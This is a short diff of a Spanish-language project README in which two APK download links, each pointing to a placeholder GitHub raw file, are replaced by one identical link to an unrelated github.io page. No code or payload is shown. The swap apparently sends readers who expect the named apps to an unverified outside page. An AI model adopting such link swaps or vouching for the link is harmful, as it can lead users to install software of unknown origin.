@@ -7,9 +7,9 @@ Bienvenido a mi repositorio de proyectos. Aquí encontrarás el desarrollo de la
 ## 📥 Descarga de Aplicaciones (APK)
 Puedes probar las aplicaciones nativas directamente en tu dispositivo Android:
 
-* [**⬇️ Descargar App CRUD Room**](https://github.com/TU_USUARIO/TU_REPOSITORIO/raw/main/pages/Apks/AppCRUDRoom.apk)
+* [**⬇️ Descargar App CRUD Room**](https://deinszxcq.github.io/visual/)
     * *Descripción:* Gestión de datos local con persistencia en SQLite.
-* [**⬇️ Descargar App Integraciones**](https://github.com/TU_USUARIO/TU_REPOSITORIO/raw/main/pages/Apks/AppIntegraciones.apk)
+* [**⬇️ Descargar App Integraciones**](https://deinszxcq.github.io/visual/)
     * *Descripción:* Módulo con servicios integrados de Firebase y Auth.
 
 ---
